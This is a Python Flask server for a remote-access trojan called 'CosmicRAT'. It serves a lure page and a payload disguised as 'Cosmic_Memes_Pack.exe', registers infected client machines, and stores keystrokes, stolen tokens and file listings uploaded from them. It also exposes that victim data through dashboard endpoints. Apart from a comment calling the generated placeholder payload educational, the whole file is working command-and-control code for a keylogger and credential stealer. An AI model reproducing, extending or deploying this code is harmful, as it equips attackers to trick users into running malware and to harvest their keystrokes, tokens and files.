from flask import Flask, render_template, jsonify, request, send_file
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from datetime import datetime
import os
import json
from werkzeug.utils import secure_filename

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = 'cosmic-rat-demo-key-2024'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///cosmic_rat.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'uploads'

# Initialize extensions
db = SQLAlchemy(app)
CORS(app)

# Create upload directory
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs('payloads', exist_ok=True)

# Database Models
class Client(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(64), unique=True, nullable=False)
    ip_address = db.Column(db.String(45), nullable=False)
    hostname = db.Column(db.String(255), nullable=False)
    operating_system = db.Column(db.String(100), nullable=False)
    first_seen = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default='active')

class Keylog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(64), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    window_title = db.Column(db.String(255))
    keystrokes = db.Column(db.Text, nullable=False)

class Token(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(64), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    token_type = db.Column(db.String(50), nullable=False)
    token_value = db.Column(db.Text, nullable=False)
    source = db.Column(db.String(255))

class FileInfo(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(64), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    filename = db.Column(db.String(255), nullable=False)
    filepath = db.Column(db.Text, nullable=False)
    filesize = db.Column(db.Integer)
    file_type = db.Column(db.String(50))

# Routes
@app.route('/')
def index():
    """Serve the meme delivery page"""
    return render_template('index.html')

@app.route('/download')
def download_payload():
    """Serve the disguised payload"""
    try:
        # Create a dummy payload if it doesn't exist
        payload_path = 'payloads/meme_pack.exe'
        if not os.path.exists(payload_path):
            with open(payload_path, 'w') as f:
                f.write("# DUMMY PAYLOAD FOR EDUCATIONAL PURPOSES ONLY\n")
                f.write("# This is not a real executable\n")
                f.write("print('CosmicRAT Demo Payload - Educational Use Only')\n")
        
        return send_file(payload_path, as_attachment=True, download_name='Cosmic_Memes_Pack.exe')
    except Exception as e:
        return jsonify({'error': 'Payload not available'}), 404

@app.route('/api/register', methods=['POST'])
def register_client():
    """Register a new client/payload"""
    try:
        data = request.get_json()
        
        # Validate required fields
        required_fields = ['client_id', 'hostname', 'os', 'ip']
        if not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields'}), 400
        
        # Check if client already exists
        existing_client = Client.query.filter_by(client_id=data['client_id']).first()
        
        if existing_client:
            # Update last seen
            existing_client.last_seen = datetime.utcnow()
            existing_client.status = 'active'
            db.session.commit()
            return jsonify({'status': 'updated', 'client_id': data['client_id']})
        else:
            # Create new client
            new_client = Client(
                client_id=data['client_id'],
                ip_address=data['ip'],
                hostname=data['hostname'],
                operating_system=data['os']
            )
            db.session.add(new_client)
            db.session.commit()
            return jsonify({'status': 'registered', 'client_id': data['client_id']})
    
    except Exception as e:
        return jsonify({'error': 'Registration failed'}), 500

@app.route('/api/upload/keylogs', methods=['POST'])
def upload_keylogs():
    """Receive keylog data from payload"""
    try:
        data = request.get_json()
        
        if 'client_id' not in data or 'keylogs' not in data:
            return jsonify({'error': 'Missing required fields'}), 400
        
        # Store keylog data
        for keylog_entry in data['keylogs']:
            keylog = Keylog(
                client_id=data['client_id'],
                window_title=keylog_entry.get('window_title', ''),
                keystrokes=keylog_entry.get('keystrokes', ''),
                timestamp=datetime.fromisoformat(keylog_entry.get('timestamp', datetime.utcnow().isoformat()))
            )
            db.session.add(keylog)
        
        # Update client last seen
        client = Client.query.filter_by(client_id=data['client_id']).first()
        if client:
            client.last_seen = datetime.utcnow()
        
        db.session.commit()
        return jsonify({'status': 'success', 'received': len(data['keylogs'])})
    
    except Exception as e:
        return jsonify({'error': 'Upload failed'}), 500

@app.route('/api/upload/tokens', methods=['POST'])
def upload_tokens():
    """Receive token data from payload"""
    try:
        data = request.get_json()
        
        if 'client_id' not in data or 'tokens' not in data:
            return jsonify({'error': 'Missing required fields'}), 400
        
        # Store token data
        for token_entry in data['tokens']:
            token = Token(
                client_id=data['client_id'],
                token_type=token_entry.get('type', 'unknown'),
                token_value=token_entry.get('value', ''),
                source=token_entry.get('source', ''),
                timestamp=datetime.fromisoformat(token_entry.get('timestamp', datetime.utcnow().isoformat()))
            )
            db.session.add(token)
        
        # Update client last seen
        client = Client.query.filter_by(client_id=data['client_id']).first()
        if client:
            client.last_seen = datetime.utcnow()
        
        db.session.commit()
        return jsonify({'status': 'success', 'received': len(data['tokens'])})
    
    except Exception as e:
        return jsonify({'error': 'Upload failed'}), 500

@app.route('/api/upload/files', methods=['POST'])
def upload_files():
    """Receive file information from payload"""
    try:
        data = request.get_json()
        
        if 'client_id' not in data or 'files' not in data:
            return jsonify({'error': 'Missing required fields'}), 400
        
        # Store file information
        for file_entry in data['files']:
            file_info = FileInfo(
                client_id=data['client_id'],
                filename=file_entry.get('filename', ''),
                filepath=file_entry.get('filepath', ''),
                filesize=file_entry.get('filesize', 0),
                file_type=file_entry.get('file_type', ''),
                timestamp=datetime.fromisoformat(file_entry.get('timestamp', datetime.utcnow().isoformat()))
            )
            db.session.add(file_info)
        
        # Update client last seen
        client = Client.query.filter_by(client_id=data['client_id']).first()
        if client:
            client.last_seen = datetime.utcnow()
        
        db.session.commit()
        return jsonify({'status': 'success', 'received': len(data['files'])})
    
    except Exception as e:
        return jsonify({'error': 'Upload failed'}), 500

@app.route('/api/clients')
def get_clients():
    """Get list of all registered clients"""
    try:
        clients = Client.query.all()
        client_list = []
        
        for client in clients:
            client_data = {
                'id': client.id,
                'client_id': client.client_id,
                'ip_address': client.ip_address,
                'hostname': client.hostname,
                'operating_system': client.operating_system,
                'first_seen': client.first_seen.isoformat(),
                'last_seen': client.last_seen.isoformat(),
                'status': client.status
            }
            client_list.append(client_data)
        
        return jsonify({'clients': client_list, 'total': len(client_list)})
    
    except Exception as e:
        return jsonify({'error': 'Failed to retrieve clients'}), 500

@app.route('/api/client/<client_id>')
def get_client_details(client_id):
    """Get detailed information for a specific client"""
    try:
        client = Client.query.filter_by(client_id=client_id).first()
        if not client:
            return jsonify({'error': 'Client not found'}), 404
        
        # Get associated data
        keylogs = Keylog.query.filter_by(client_id=client_id).limit(50).all()
        tokens = Token.query.filter_by(client_id=client_id).limit(50).all()
        files = FileInfo.query.filter_by(client_id=client_id).limit(100).all()
        
        client_details = {
            'client_info': {
                'id': client.id,
                'client_id': client.client_id,
                'ip_address': client.ip_address,
                'hostname': client.hostname,
                'operating_system': client.operating_system,
                'first_seen': client.first_seen.isoformat(),
                'last_seen': client.last_seen.isoformat(),
                'status': client.status
            },
            'keylogs': [
                {
                    'id': k.id,
                    'timestamp': k.timestamp.isoformat(),
                    'window_title': k.window_title,
                    'keystrokes': k.keystrokes
                } for k in keylogs
            ],
            'tokens': [
                {
                    'id': t.id,
                    'timestamp': t.timestamp.isoformat(),
                    'type': t.token_type,
                    'value': t.token_value[:100] + '...' if len(t.token_value) > 100 else t.token_value,
                    'source': t.source
                } for t in tokens
            ],
            'files': [
                {
                    'id': f.id,
                    'timestamp': f.timestamp.isoformat(),
                    'filename': f.filename,
                    'filepath': f.filepath,
                    'filesize': f.filesize,
                    'file_type': f.file_type
                } for f in files
            ]
        }
        
        return jsonify(client_details)
    
    except Exception as e:
        return jsonify({'error': 'Failed to retrieve client details'}), 500

@app.route('/api/stats')
def get_stats():
    """Get overall statistics"""
    try:
        total_clients = Client.query.count()
        active_clients = Client.query.filter_by(status='active').count()
        total_keylogs = Keylog.query.count()
        total_tokens = Token.query.count()
        total_files = FileInfo.query.count()
        
        stats = {
            'total_clients': total_clients,
            'active_clients': active_clients,
            'total_keylogs': total_keylogs,
            'total_tokens': total_tokens,
            'total_files': total_files
        }
        
        return jsonify(stats)
    
    except Exception as e:
        return jsonify({'error': 'Failed to retrieve statistics'}), 500

# Initialize database
with app.app_context():
    db.create_all()

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)